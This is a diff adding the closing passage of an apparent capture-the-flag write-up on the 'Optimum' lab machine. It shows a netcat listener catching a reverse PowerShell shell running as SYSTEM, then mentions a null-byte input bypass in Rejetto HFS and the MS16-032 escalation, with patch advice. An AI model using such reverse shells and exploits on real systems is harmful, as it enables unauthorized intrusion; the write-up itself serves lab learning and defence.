@@ -461,3 +461,23 @@ And on our listener:
 ```
 kali@kali:~/Downloads$ sudo rlwrap nc -nlvp 1337
 Listening on 0.0.0.0 1337
+Connection received on 10.129.1.127 49383
+Windows PowerShell running as user OPTIMUM$ on OPTIMUM
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Users\kostas\Desktop>whoami
+nt authority\system
+```
+
+
+## Comparing to the official writeup:
+
+The official writeup used the same exploits I did. They used metasploit the entire way. And it was fairly simple.
+
+I am very happy that I decided to explore the exploits further. As it greatly increased my knowledge of powershell scripting, and a very cool windows exploit. As well as null bytes to exploit bad sanitization of input. 
+
+## How to stop this exploit:
+
+Make sure everything is updated. And make sure that the sanitization functions also account for null-bytes. This was fixed in Rejetto HFS Version 2.3c
+
+The Windows exploit has a patch here: https://support.microsoft.com/en-hk/help/3143141/ms16-032-security-update-for-secondary-logon-to-address-elevation-of-p 
